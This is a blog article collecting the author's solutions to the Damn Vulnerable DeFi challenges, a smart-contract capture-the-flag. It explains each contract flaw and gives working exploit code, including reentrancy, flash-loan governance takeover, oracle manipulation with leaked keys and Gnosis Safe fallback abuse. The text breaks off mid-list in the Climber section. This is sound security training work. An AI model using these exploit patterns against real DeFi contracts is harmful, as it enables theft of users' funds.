# Damn Vulnerable DeFi solutions (Brownie)

<link rel="stylesheet" href="/articles/damn_vulnerable_defi_solutions/postStyles.css">

<div class="text-center pb-3 sm:pb-4">
  <span class="font-black"><b>October 25th, 2022</b></span>
</div>

This article is a collection of my solutions to the Damn Vulnerable DeFi challenges. In this article I will basically copy-paste all my solution write-ups from the [github repo](https://github.com/dreth/Damn-Vulnerable-DeFi-Brownie-Solutions) where my solutions and scripts are.

I used Brownie tests to solve it just like in the original challenges which use JS+Hardhat, but using Brownie+Hardhat and Brownie+Anvil.

If you want to reproduce the same environment I used for it, you can clone the [repo I made as a clean slate](https://github.com/dreth/Damn-Vulnerable-DeFi-Brownie) to solve the challenges with Brownie. It took a while to adapt them, but it was a really fun challenge.

***

## Article index

- [Damn Vulnerable DeFi solutions (Brownie)](#damn-vulnerable-defi-solutions-brownie)
  - [Article index](#article-index)
  - [Unstoppable](#unstoppable)
      - [Challenge description](#challenge-description)
      - [Solution](#solution)
  - [Naive receiver](#naive-receiver)
      - [Challenge description](#challenge-description-1)
      - [Solution](#solution-1)
  - [Truster](#truster)
      - [Challenge description](#challenge-description-2)
      - [Solution](#solution-2)
  - [Side entrance](#side-entrance)
      - [Challenge description](#challenge-description-3)
      - [Solution](#solution-3)
  - [The rewarder](#the-rewarder)
      - [Challenge description](#challenge-description-4)
      - [Solution](#solution-4)
  - [Selfie](#selfie)
      - [Challenge description](#challenge-description-5)
      - [Solution](#solution-5)
  - [Compromised](#compromised)
      - [Challenge description](#challenge-description-6)
      - [Solution](#solution-6)
  - [Puppet](#puppet)
      - [Challenge description](#challenge-description-7)
      - [Solution](#solution-7)
  - [Puppet V2](#puppet-v2)
      - [Challenge description](#challenge-description-8)
      - [Solution](#solution-8)
  - [Free rider](#free-rider)
      - [Challenge description](#challenge-description-9)
      - [Solution](#solution-9)
  - [Backdoor](#backdoor)
      - [Challenge description](#challenge-description-10)
      - [Solution](#solution-10)
  - [Climber](#climber)
      - [Challenge description](#challenge-description-11)
      - [Solution](#solution-11)
    - [Extras](#extras)

***

## Unstoppable

#### Challenge description

> There's a lending pool with a million DVT tokens in balance, offering flash loans for free.
>
> If only there was a way to attack and stop the pool from offering flash loans ...
> 
> You start with 100 DVT tokens in balance.

#### Solution

There's a bug in the UnstoppableLender contract which can be exploited to prevent new flash loans from being offered.

Line 37 in the `flashLoan()` function checks for the current contract token balance:

```cs
uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
```

This checks for the *real token balance in the contract*. But then, the contract compares it with the variable `poolBalance`:

```cs
assert(poolBalance == balanceBefore);
```

`poolBalance` can only increase if a deposit is made through the `depositTokens` function:

```cs
poolBalance = poolBalance + amount;
```

But the actual token balance of the contract can be changed by simply sending tokens to it. And the pool contract has no way of getting rid of these tokens.

If we send 1 token unit to the contract, it will no longer be able to concede any flash loans, as the assertion will always fail.

***

## Naive receiver

#### Challenge description

> There's a lending pool offering quite expensive flash loans of Ether, which has 1000 ETH in balance.
>
> You also see that a user has deployed a contract with 10 ETH in balance, capable of interacting with the lending pool and receiveing flash loans of ETH.
>
> Drain all ETH funds from the user's contract. Doing it in a single transaction is a big plus ;)

#### Solution

The receiver contract will forward `amountToBeRepaid` to the pool, which includes the pool fee:

```cs
uint256 amountToBeRepaid = msg.value + fee;
```

And the pool will always charge a fixed fee of 1 ETH in `flashLoan()`:

```cs
require(
    address(this).balance >= balanceBefore + FIXED_FEE,
    "Flash loan hasn't been paid back"
);
```

Given that the `receiveEther()` function does not check for a `msg.value` and that the contract doesn't check that `tx.origin` comes from the deployer of the receiver contract (whoever owns it), it is possible to drain its balance and send it to the pool in either 10 transactions with a `borrowAmount` of 0 wei or in one transaction in a short contract which performs a loop:

```cs
function attack() public {
    for (uint8 i = 0; i < 10; i++) {
        naiveReceiverPool.flashLoan(address(naiveReceiver), 0);
    }
}
```

***

## Truster

#### Challenge description

> More and more lending pools are offering flash loans. In this case, a new pool has launched that is offering flash loans of DVT tokens for free.
>
> Currently the pool has 1 million DVT tokens in balance. And you have nothing.
>
> But don't worry, you might be able to take them all from the pool. In a single transaction.

#### Solution

After the TrusterLenderPool transfers borrowed tokens to the borrower, it runs the following call to a specified `target` contract which is supposed to perform certain actions in behalf of the borrower (as the borrower programs it) with the tokens and is supposed to return the tokens back into the pool:

```cs
target.functionCall(data);
```

However, there is no restriction as to which contract can be passed as `target`, therefore we can pass any contract address, including that of the DVT token contract.

The way I chose to solve this challenge is by passing the DVT token contract and calling `approve()` passing the attacker address as spender and with `TOKENS_IN_POOL` as the spending limit.

After the approval, I drained all the pool funds by calling `transferFrom()`.

***

## Side entrance

#### Challenge description

> A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.
>
> This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
>
> You must take all ETH from the lending pool.

#### Solution

SideEntranceLenderPool's `flashLoan()` function expects to interact with a contract and call its `execute` function forwarding the value that the borrower requests (`amount`). This contract is open to reentrancy vulnerabilities and it can be exploited to drain its funds.

Then, the `flashLoan()` function checks the following:

```cs
require(address(this).balance >= balanceBefore, "Flash loan hasn't been paid back"); 
```

Meaning the funds can be returned to the contract through `deposit()`:

```cs
function execute() external payable {
    pool.deposit{value: msg.value}();
}
```

Given the reentrancy vulnerability, we can call `deposit()` in `execute()` with the funds obtained from the flash loan, which credits them to the attacker contract address in the `balances` mapping.

This entitles the attacker contract to withdrawing the full pool contract balance, which can be then forwarded to the attacker address:

```cs
function withdrawFromPool() external payable {
    pool.withdraw();
}

receive() external payable {
    payable(owner).sendValue(msg.value);
}
```

***

## The rewarder

#### Challenge description

> There's a pool offering rewards in tokens every 5 days for those who deposit their DVT tokens into it.
>
> Alice, Bob, Charlie and David have already deposited some DVT tokens, and have won their rewards!
>
> You don't have any DVT tokens. But in the upcoming round, you must claim most rewards for yourself.
>
> Oh, by the way, rumours say a new pool has just landed on mainnet. Isn't it offering DVT tokens in flash loans? 

#### Solution

The TheRewarderPool mints reward tokens every time it calls `distributeRewards()` and the user has an amount of rewards larger than 0, which is computed as follows:

```cs
rewards = (amountDeposited * 100 * 10 ** 18) / totalDeposits;
```

To claim such rewards, `isNewRewardsRound()` has to return `true`. The only way this can happen is if it's been 5 days since the last snapshot was taken. 

What we have to do here is deploy an attacker contract that can perform the following steps, this all has to be done _twice_, both times after waiting 5 days<sup><b>*</b></sup>:

* Take a loan from the flash loaner pool of a large amount of tokens, ideally all of them:

```cs
flashLoanerPool.flashLoan(IERC20(pool.liquidityToken()).balanceOf(address(flashLoanerPool)));
```

Then, in its `receiveFlashLoan()` function:

* Approve the spending limit of the liquidity token to equal the amount borrowed from the flash loaner pool:

```cs
IERC20(pool.liquidityToken()).approve(address(pool), amount);
```

* Deposit the tokens and then withdraw them. This will call `distributeRewards()` on deposit, which will send the attacker contract all the reward tokens that correspond to it 

```cs
pool.deposit(amount);
pool.withdraw(amount);
```

* Return the tokens to the flash loaner pool

```cs
IERC20(pool.liquidityToken()).transfer(address(flashLoanerPool), amount);
```

* Transfer all tokens to the attacker address, which I set up as `owner` during deployment

```cs
IERC20(pool.rewardToken()).transfer(address(owner), IERC20(pool.rewardToken()).balanceOf(address(this)));
```

<sup><b>*</b></sup> Since the challenge is designed to work on a local testnet, I believe it to be acceptable to run a command like `evm_increaseTime`, however, if this were on a live network, we would have a window of time to run the `distributeRewards()` after calling `deposit()` with a really large amount of tokens in order to skew rewards so much that we essentially capture almost all of them when `distributeRewards()` is called and `isNewRewardsRound()` returns `true`. The attacker contract needs to be the _first_ address that calls `distributeRewards()` because it is called _during_ the transaction in which the attacker contract has all the borrowed funds from the flash loan, if anyone _else_ calls `distributeRewards()` before the flash loan is taken or after it's returned, the reward tokens are correctly distributed.

***

## Selfie

#### Challenge description

> A new cool lending pool has launched! It's now offering flash loans of DVT tokens.
>
> Wow, and it even includes a really fancy governance mechanism to control it.
>
> What could go wrong, right ?
>
> You start with no DVT tokens in balance, and the pool has 1.5 million. Your objective: take them all.

#### Solution

For this challenge, there's a pool offering flash loans and a simple governance contract which has privileges to call functions in the pool contract which are locked by a modifier (`onlyGovernance()`) which require the caller to be the governance contract.

In order to bypass this, we have to be able to propose and execute governance proposals. Anyone can execute a governance proposal in due time if the conditions in `_canBeExecuted()` for a specific `actionId` are met. In this case there's a requirement to wait 2 days after proposing it and before executing it, and the action must not have already been executed (`actionToExecute.executedAt == 0`).

An account is also only allowed to make proposals if it holds at least half of the total supply of the token plus 1 (_yay decentralization?_ or something like that)

After all these requirements are passed, we can call an `onlyGovernance()` gated function called `drainAllFunds()` in SelfiePool, and pass which address we want to send all the funds to.

Given that SelfiePool offers loans in exactly the same token that is required to make governance proposals, I did the following to successfully drain all funds:

First deploy an attacker contract which can take loans from the pool:

```cs
function takeLoan() public {
    // execute a flash loan borrowing all available DVT tokens in the pool
    pool.flashLoan(fundsInPool);
}
```

Where `fundsInPool` is a variable set by the constructor of the contract which obtains the entire balance of DVT tokens in the SelfiePool.

The attacker contract must contain a `receiveTokens()` function which takes a snapshot of the token balance:

```cs
token.snapshot();
```

Then queues a governance action with some calldata which executes `drainAllFunds()` with the attacker address as parameter:


```cs
maliciousAction = governance.queueAction(address(pool), attackData, 0);
```

Where `attackData` is such calldata.

After these two actions, the contract should return the borrowed funds back to the pool:

```cs
token.transfer(address(pool), amount);
```

After deploying the attacker contract, I generated the calldata for the `drainAllFunds()` function and set it to the `attackData` state variable in the attacker contract.

Call the function in the attacker contract that takes the loan, which executes the actions in `receiveTokens()`, those described in step 1.

Wait 2 days using the rpc `evm_increaseTime` request (acceptable as it's a testnet environment, in the real world 2 days have to pass)

Execute the governance action calling `executeAction()` with the corresponding `actionId`.

This will drain the funds and transfer them to the attacker address.

***

## Compromised

#### Challenge description

> While poking around a web service of one of the most popular DeFi projects in the space, you get a somewhat strange response from their server. This is a snippet:

```
HTTP/2 200 OK
content-type: text/html
content-language: en
vary: Accept-Encoding
server: cloudflare

4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 
30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 
55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 
47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 
4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 
68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35

4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 
68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 
55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 
32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 
4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 
33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34
```

> A related on-chain exchange is selling (absurdly overpriced) collectibles called "DVNFT", now at 999 ETH each
>
> This price is fetched from an on-chain oracle, and is based on three trusted reporters:
> `0xA73209FB1a42495120166736362A1DfA9F95A105`
> `0xe92401A4d3af5E446d93D11EEc806b1462b39D15`
> `0x81A5D6E50C214044bE44cA0CB057fe119097850c`
>
> Starting with only 0.1 ETH in balance, you must steal all ETH available in the exchange.

#### Solution

The server response has 2 long strings which when decoded as a string as suggested by the headers, they return the following:

```
MHhjNjc4ZWYxYWE0NTZkYTY1YzZmYzU4NjFkNDQ4OTJjZGZhYzBjNmM4YzI1NjBiZjBjOWZiY2RhZTJmNDczNWE5
```

```
MHgyMDgyNDJjNDBhY2RmYTllZDg4OWU2ODVjMjM1NDdhY2JlZDliZWZjNjAzNzFlOTg3NWZiY2Q3MzYzNDBiYjQ4
```

These look like base64 strings, which we can further decode into:

```
0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
```

```
0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

When trying these out as private keys, we obtain the private keys for the last two addresses in the `sources` list, which are the EOAs allowed to post prices to the oracle.

Now that we can use these addresses, we can call `postPrice()` for the "DVNFT" NFTs:

```python
oracle.postPrice("DVNFT",0, _fromLeakedAcc[0])
oracle.postPrice("DVNFT",0, _fromLeakedAcc[1])
```

After posting 0 for each of them, the median price returned by `getMedianPrice()` will return 0, as the median of $\{990, 0, 0\}$ is $0$.

We can then use the attacker account to buy one of these NFTs for 1 wei. We need to send at least 1 wei when buying, as requested by the `buyOne()` function:

```cs
uint256 amountPaidInWei = msg.value;
require(amountPaidInWei > 0, "Amount paid must be greater than zero");
```

After obtaining the NFT, we can post a new price corresponding to the entire balance of the NFT exchange:

```python
oracle.postPrice("DVNFT", exchange.balance(), _fromLeakedAcc[0])
oracle.postPrice("DVNFT", exchange.balance(), _fromLeakedAcc[1])
```

Then we must approve the token to be taken from the attacker wallet by the exchange calling `approve()` with the ID of our NFT (`0`):

```py
nft_token.approve(exchange.address, 0, _fromAttacker)
```

Then we sell the token calling `sellOne()` with the token ID:

```py
exchange.sellOne(0, _fromAttacker)
```

And then we return the price to normal, as requested by the challenge:

```py
oracle.postPrice("DVNFT",ether_to_wei(999), _fromLeakedAcc[0])
oracle.postPrice("DVNFT",ether_to_wei(999), _fromLeakedAcc[1])
```

***

## Puppet

#### Challenge description

> There's a huge lending pool borrowing Damn Valuable Tokens (DVTs), where you first need to deposit twice the borrow amount in ETH as collateral. The pool currently has 100000 DVTs in liquidity.
>
> There's a DVT market opened in an Uniswap v1 exchange, currently with 10 ETH and 10 DVT in liquidity.
>
> Starting with 25 ETH and 1000 DVTs in balance, you must steal all tokens from the lending pool.

#### Solution

For this challenge there's a huge vulnerability in the PuppetPool contract where it only computes the price of the token from one source, the Uniswap V1 pool of DVT/ETH tokens.

If there's only one price source, the source can be easily manipulated, as we have 100 times more tokens than the Uniswap V1 pool, thus allowing us to push the price way down, to the point where it's possible to drain almost all the ETH in the uniswap pool.

To solve the challenge, first we have to approve the tokens for trade on the Uniswap V1 pool of DVT/ETH tokens:

```python
token.approve(
    uniswap_exchange.address, 
    2**256 - 1, 
    _fromAttacker
)
```

Here I used a pseudo-infinite approval (usually just called infinite approvals in DeFi), though this is not really necessary.

Then drain the pool of as much ETH as we can get in order to push the price of DVT tokens to as low as we can get it:

```python
uniswap_exchange.tokenToEthSwapOutput(
    ether_to_wei(9.9), 
    ether_to_wei(1000), 
    web3.eth.get_block('latest').timestamp * 2, 
    _fromAttacker
)
```

Then calculate the required deposit of ETH in order to borrow *all* the tokens in the lending pool by calling `calculateDepositRequired()`:

```python
deposit_required = lending_pool.calculateDepositRequired(ether_to_wei(100000))
```

And finally, borrow all the tokens sending the value required assigned to the `deposit_required` variable:

```python
lending_pool.borrow(
    ether_to_wei(100000), 
    _fromAttacker | value_dict(deposit_required)
) 
```

This will effectively take all the tokens in the lending pool.

***

## Puppet V2

#### Challenge description

> The developers of the last lending pool are saying that they've learned the lesson. And just released a new version!
>
> Now they're using a Uniswap v2 exchange as a price oracle, along with the recommended utility libraries. That should be enough.
>
> You start with 20 ETH and 10000 DVT tokens in balance. The new lending pool has a million DVT tokens in balance. You know what to do ;)

#### Solution

This challenge is *identical* to the puppet challenge, except it uses Uniswap V2. Once again, we can manipulate the price of the token by selling a bunch of DVT tokens for ETH, which reduces the price of DVT tokens relative to ETH so much that it's possible to borrow the entire token balance of the PuppetV2Pool pool.

The only added change here is that Uniswap V2 only performs token to token swaps, where ETH must be wrapped as WETH (an ERC20 token 1:1 with ETH).

The steps to perform the attack are really similar to those of the Puppet challenge:

First we must approve the token spending limit for the Uniswap V2 router:

```py
token.approve(uniswap_router.address, 2**256 - 1, _fromAttacker)
```

Then exchange all the tokens in our wallet for ETH:

```py
uniswap_router.swapExactTokensForETH(
    ether_to_wei(10000), 
    9.92, 
    [token.address, weth.address],
    attacker.address,
    web3.eth.get_block('latest').timestamp * 2,
    _fromAttacker
)
```

`swapTokensForExactTokens()` can also be used, as we're going to use WETH anyway, but we would have to wrap some extra ETH to reach the right amount to drain the pool anyway, so I decided to just use `swapExactTokensForETH()`.

Then obtain what amount of WETH we must deposit to drain the pool:

```py
amount = lending_pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
```

Deposit this same amount into the WETH contract:

```py
weth.deposit(_fromAttacker | value_dict(amount))
```

Now with the WETH in hand we must approve the spending limit of WETH for the PuppetV2Pool contract to the `amount` obtained before (or more):

```py
weth.approve(lending_pool.address, amount, _fromAttacker)
```

Given that the PuppetV2Pool calls `transferFrom()` in `borrow()`:

```cs
_weth.transferFrom(msg.sender, address(this), depositOfWETHRequired);
```

Then just call borrow to drain the pool:

```py
lending_pool.borrow(POOL_INITIAL_TOKEN_BALANCE, _fromAttacker)
```

And we should receive all the DVT tokens from the pool.

***

## Free rider

#### Challenge description

> A new marketplace of Damn Valuable NFTs has been released! There's been an initial mint of 6 NFTs, which are available for sale in the marketplace. Each one at 15 ETH.
>
> A buyer has shared with you a secret alpha: the marketplace is vulnerable and all tokens can be taken. Yet the buyer doesn't know how to do it. So it's offering a payout of 45 ETH for whoever is willing to take the NFTs out and send them their way.
>
> You want to build some rep with this buyer, so you've agreed with the plan.
>
> Sadly you only have 0.5 ETH in balance. If only there was a place where you could get free ETH, at least for an instant. 

#### Solution

The FreeRiderNFTMarketplace contract has a vulnerability in `_buyOne()` where `msg.value` is checked and compared to the price of the NFTs which we want to bulk buy through `buyMany()`. However, the comparison is *individually* made for *each* NFT we try to purchase with `buyMany()`. This opens up the possibility of buying *all* NFTs we order for the price of the *highest* one alone, making all others free. 

In this case, we can exploit this by sending 15 ether, which ends up covering for *all* of them (as opposed to 15 * 6 = 90 ether), thereby netting us +75 ether.

To exploit this, we first need to code a contract, as it's the only way to take the flash loan from uniswap.

The attacker contract should have a function which calls the `swap()` function and routes its internal `uniswapV2Call()` call to a function inside of our contract, so we must override the `uniswapV2Call()` function imported from the IUniswapV2Callee interface.

In my case, since we only need WETH, I made the `flashSwap()` function only take amounts of WETH in count:

```cs
function flashSwap(uint256 _amount) external {
    // we want to specifically borrow weth
    uint256 amount0 = pair.token0() == weth ? _amount : 0;
    uint256 amount1 = pair.token1() == weth ? _amount : 0;
    
    // encoded data for `swap` to understand it's a flashloan and not just a swap
    bytes memory data = abi.encode(weth, _amount);
    pair.swap(amount0, amount1, address(this), data);
}
```

Then within the `uniswapV2Call()` function we have already received the tokens, so we can now do stuff with them, in this case, the first thing we need to do is convert the WETH to ETH, as the marketplace only accepts ETH:

```cs
IERC20(weth).approve(weth, type(uint256).max);
weth.functionCall(abi.encodeWithSignature("withdraw(uint256)", amount));
```

All we need to take is 15 ether, as it's all needed to take all the NFTs from the marketplace.

After withdrawing the ether, I create an array of integers with all the token IDs for the NFTs we want to buy. I defined this function to generate a dynamic array of integers with values from 0 to `size`:

```cs
function arrayOfIntegers(uint256 size) private returns (uint256[] memory) {
    uint256[] memory uintArray = new uint256[](size);
    for (uint256 i = 0; i < size; i++) {
        uintArray[i] = i;
    }
    return uintArray;
}
```

I'm sure there's much better ways to do this, but here we are. Anyway, With this function I generate the array:

```cs
uint256 amountOfOffers = marketplace.amountOfOffers();
uint256[] memory tokenIdsArray = arrayOfIntegers(amountOfOffers);
```

Which must be passed to the marketplace's `buyMany()` function along with the 15 ether:

```cs
marketplace.buyMany{value: amount}(tokenIdsArray);
```

Then the NFTs must be transferred to the buyer, so we loop over token IDs and perform a `safeTransferFrom()`, I coded a short function for this to keep `uniswapV2Call()` cleaner:

```cs
function bulkSafeTransferNFT(uint256[] memory tokenIds) private {
    for (uint256 i = 0; i < tokenIds.length; i++) {
        nft.safeTransferFrom(address(this), address(buyer), tokenIds[i]);
    }
}
```

Then I call this function to send the corresponding purchased tokens to the buyer, so the attacker can get the payment for them:

```cs
bulkSafeTransferNFT(tokenIdsArray);
```

Then the amount to repay has to be computed, as there's a 0.3% fee on top of the loan taken from Uniswap:

```cs
uint256 amountToRepay = amount + (((amount*3)/997)+1);
```

Then the loan can be repayed depositing the ETH to get WETH and transferring the WETH back into the pair address:

```cs
weth.functionCallWithValue(abi.encodeWithSignature("deposit()"), amountToRepay);
IERC20(weth).transfer(address(pair), amountToRepay);
```

Then finally I call a `recoverETH()` function I coded into the contract to obtain the net profits from the marketplace exploit:

```cs
function recoverETH() external {
    owner.sendValue(address(this).balance);
}
```

Where `owner` is the attacker address.

It's important to note that there should be a `onERC721Received()` function which allows the contract to receive the NFTs through the marketplace's safe transfer call.

Also, the contract needs to have a fallback function to receive Ether, as the marketplace will forward some when the purchases are made.

***

## Backdoor

#### Challenge description

> To incentivize the creation of more secure wallets in their team, someone has deployed a registry of Gnosis Safe wallets. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.
>
> To make sure everything is safe and sound, the registry tightly integrates with the legitimate Gnosis Safe Proxy Factory, and has some additional safety checks.
>
> Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.
>
> Your goal is to take all funds from the registry. In a single transaction. 

#### Solution

The Backdoor challenge tasks us with deploying a Gnosis Safe proxy for 4 users through a Gnosis Safe Proxy Factory. After each deployment, 10 DVT tokens will be distributed to each one of those users (the beneficiaries)

For the registry to accept each proxy creation as correct and to steal the tokens, we must code an attacker contract that makes the calls and pass a few conditions:

1. The WalletRegistry contract must have enough DVT tokens to make the payment to the beneficiary

```cs
require(token.balanceOf(address(this)) >= TOKEN_PAYMENT, "Not enough funds to pay");
```

This does not directly depend on us, so we can continue.

1. The caller contract must be the GnosisSafeProxyFactory contract

```cs
require(msg.sender == walletFactory, "Caller must be factory");
```

To achieve this, all we have to do is use the correct call when creating the proxy through the proxy factory contract. The call that invokes this function in the WalletRegistry (of course, specifying that this is the wallet registry that will receive the callback) is the function `createProxyWithCallback()`. This function takes the following parameters:

```cs
function createProxyWithCallback(
    address _singleton,
    bytes memory initializer,
    uint256 saltNonce,
    IProxyCreationCallback callback
)
```

+ The `_singleton` address is the Gnosis Safe implementation contract address, which the WalletRegistry contract refers to as the `masterCopy`.
+ The `initializer` data, which is the data we will generate to call `setup()` (detailed on condition 3)
+ The `saltNonce` which we can just set as 0
+ The `callback`, which is the address to the WalletRegistry contract, but since it can only be passed as an IProxyCreationCallback interface, we must pass it as such `IProxyCreationCallback(registry)` by importing the interface at the top of the attacker contract

3. The right singleton contract must be used

```cs
require(singleton == masterCopy, "Fake mastercopy used");
```

This is covered by using the address of `masterCopy` (the Gnosis Safe implementation contract) correctly when calling `createProxyWithCallback()`


4. We must be calling `setup()`

```cs
require(bytes4(initializer[:4]) == GnosisSafe.setup.selector, "Wrong initialization");
```

`setup()` is the initializer function for a Gnosis Safe multisignature wallet. This function is in the Gnosis Safe implementation contract (GnosisSafe.sol) and it takes the following parameters:

```cs
function setup(
    address[] calldata _owners,
    uint256 _threshold,
    address to,
    bytes calldata data,
    address fallbackHandler,
    address paymentToken,
    uint256 payment,
    address payable paymentReceiver
)
```

+ `_owners` must be an array with the addresses that will control this contract. Here we must input an array with a single element per multisig we initialize, one per user.
+ `_threshold` is the number of required confirmations per transaction signed by the safe. E.g. if `_threshold` is 4 and the size of `_owners` is 7, then at least 4 out of the 7 owner addresses must sign for a transaction to go through. In this case, this value must be 1.
+ `to` is a contract address to which an optional delegate call will be made, this can be set as the null address.
+ `data` payload for that optional delegate call. This can be 0.
+ **`fallbackHandler`** is the parameter which we will use to be able to exploit the wallets despite not being an owner of the wallet. This parameter is an address which will handle fallback calls to the contract, if we make a call that contains a function selector that does not match any function in the safe, then this selector and the calldata will be forwarded to a fallback contract which corresponds to the address of `fallbackHandler`. **Here we can input the DVT token contract address**.
+ `paymentToken` is the address of a token that can be optionally used to pay gas fees for transactions, we won't use gas tokens so this can be the null address as we want to use ETH to pay for txs.
+ `payment` is the value that should be payed in case a gas token is used. We'll use ETH, so this should be 0.
+ `paymentReceiver` is the address that will receive the payment. This should be the null address so that it's set to `tx.origin`.

5. The `_threshold` parameter in the `setup()` call needs to be 1.

```cs
require(GnosisSafe(walletAddress).getThreshold() == MAX_THRESHOLD, "Invalid threshold");
```

As specified in 4.

6. The `_owners` array must be of length 1, so each multisig wallet must have at most 1 owner.

```cs
require(GnosisSafe(walletAddress).getOwners().length == MAX_OWNERS, "Invalid number of owners");
```

As specified in 4.

7. The owner set per multisig must be in the list of beneficiaries.

```cs
require(beneficiaries[walletOwner], "Owner is not registered as beneficiary");
```

After all requirements pass, the DVT tokens will be transferred to the created Gnosis Safe multisig. Each multisig will receive 10 DVT tokens.

To steall all the tokens in one transaction, we must create a function in the attacker contract that will perform the following workflow:

1. Create the multisig for user `user`.
    + The creation will assign the `fallbackHandler` as the DVT token contract address
    + The creation will assign the `callback` proxy creation callback interface to the WalletFactory contract

2. Make a call to the newly created Gnosis Safe multisig for user `user` with function selector + calldata performing a token transfer. The function selector specified must be that of the `transfer()` function of the DVT token contract. The calldata should be the receiver of those tokens (the attacker address) and the amount should be the entire balance that the WalletRegistry will send to the newly created multisig (10 DVT tokens). This call will effectively transfer the 10 DVT tokens in that Safe to the attacker's address.

I decided to pass the calldata for the `setup()` and `transfer()` functions as a parameter to the function so that the contract is more readable:

```cs
function deploySafesAndStealTokens(bytes[] calldata maliciousSetupCalls, bytes calldata maliciousTransferCall) external {
    // loop over the malicious calls, creating a new proxy per loop
    // which will allow us to then call transfer after the token contract
    // is set up as a fallback contract for the wallet
    for (uint256 i = 0; i < maliciousSetupCalls.length; i++) {
        GnosisSafeProxy newGnosisSafeWallet = gspf.createProxyWithCallback(
            singleton,
            maliciousSetupCalls[i],
            0,
            IProxyCreationCallback(registry)
        );
        
        // transfer tokens to tx.origin, the attacker
        (bool success,) = address(newGnosisSafeWallet).call(maliciousTransferCall);

        // make sure the transfer is made
        require(success, "tokens stealing failed");
    }
}
```

To generate the data for this calls I just used the `encode_input` method in Brownie:

+ `setup()` call

```py
# malicious calls list
malicious_setup_calls = []

# loop over addresses
for user in users: 

    # setup call encoding from master copy
    malicious_setup_calls.append(
        master_copy.setup.encode_input(
            [user],
            1,
            ZERO_ADDRESS,
            0,
            token.address,
            ZERO_ADDRESS,
            0,
            ZERO_ADDRESS
        )
    )
```

+ `transfer()` call

```py
token_stealing_call = token.transfer.encode_input(
    attacker.address, 
    AMOUNT_TOKENS_DISTRIBUTED // len(users)
)
```

And then just call the attacker contract function to do it all in one transaction:

```py
attacker_contract.deploySafesAndStealTokens(
    malicious_setup_calls, 
    token_stealing_call, 
    _fromAttacker
)
```

***

## Climber

#### Challenge description

>There's a secure vault contract guarding 10 million DVT tokens. The vault is upgradeable, following the UUPS pattern.
>
>The owner of the vault, currently a timelock contract, can withdraw a very limited amount of tokens every 15 days.
>
>On the vault there's an additional role with powers to sweep all tokens in case of an emergency.
>
>On the timelock, only an account with a "Proposer" role can schedule actions that can be executed 1 hour later.
>
>Your goal is to empty the vault. 

#### Solution

The vulnerability in this challenge lies on the `execute()` function of the ClimberTimelock contract. This function essentially allows us to call any function in the contract unrestricted, as the `msg.sender` of that function call is the contract itself. Which is assigned the `ADMIN_ROLE` in the constructor of the contract:

```cs
_setupRole(ADMIN_ROLE, address(this));
```

Therefore, we must make a sequence of calls through the `execute()` function that would effectively allow us to drain the ClimberVault contract's tokens.

We must code an attacker contract that will call the ClimberTimelock contract. The reason we do this (as it is technically possible to call the `execute()` function from an EOA) is because in order for `execute()` to be able to run all the code we need to run `schedule()` to schedule the action at some point, either before calling `execute()` or _through_ `execute()`. However, it is not possible to call `schedule()` through `execute()` directly through the ClimberTimelock contract, as it will require `schedule()` to include its own call, which is not possible, as it would lead to an infinite chain of `schedule()` calls.

As a result, we must make it so that the attacker contract contains a `schedule()` function which passes the parameters of this `execute()` call to a `schedule()` call on the timelock contract.

I coded both an `attack()` and a `schedule()` function as follows:

```cs
function attack(bytes calldata payload) external payable {
    // save the calldata for later
    (targets, values, dataElements, salt) = abi.decode(payload, (address[], uint256[], bytes[], bytes32));

    // perform the malicious call
    timelock.execute(targets, values, dataElements, salt);
}

function schedule() external {
    timelock.schedule(targets, values, dataElements, salt);
}
```

Where `targets`, `values`, `dataElements` and `salt` (the parameters to be passed to `execute()` and `schedule()`) are defined as state variables and assigned to the variables when calling `attack()`.

```cs
address[] public targets;
uint256[] public values;
bytes[] public dataElements;
bytes32 public salt;
```

The calls required to be made through `execute()` as an initial setup to solve the challenge are the following:

1. **Target:** ClimberTimelock address.
   **Value:** 0.
   **Data:** We must update the timelock delay to 0 seconds by calling `updateDelay()` with the parameter 0. Therefore: `24adbc5b0000000000000000000000000000000000000000000000000000000000000000`.
   **Why:** The delay must be updated to immediately execute actions scheduled through `schedule()`, otherwise the calls will fail.

2. **Target:** ClimberTimelock address.
   **Value:** 0.
   **Data:** We must call `grantRole()` with the `PROPOSER_ROLE` and the address of the attacker contract. Therefore (for my attacker contract address): `2f2ff15db09aa5aeb3702cfd50b6b62bc4532604938f21248a27a1d5ca736082b6819cc1000000000000000000000000261D8c5e9742e6f7f1076Fa1F560894524e19cad`.
   **Why:** This allows the attacker contract to `schedule()` actions, which is required to `execute()` them, though the scheduling can be done _within_ the `execute()` call (reentrancy). This will be the 4th call.

3. **Target:** ClimberVault address.
   **Value:** 0.
   **Data:** We must call `transferOwnership()` on the vault contract (the timelock contract can call it because it is created and set as owner when the vault is initialized: `transferOwnership(address(new ClimberTimelock(admin, proposer)));`). The call should transfer the ownership to the attacker address. Therefore (for my attacker address): `f2fde38b00000000000000000000000090F79bf6EB2c4f870365E785982E1f101E93b906`.
   **Why:** By transferring ownership to the attacker, the attacker can later swap the implementation of the ClimberVault contract to a contract which allows the attacker to sweep the tokens. For this we will need to code a contract which will replace ClimberVault, but must have the same storage layout.

4. **Target:** Attacker contract address.
   **Value:** 0.
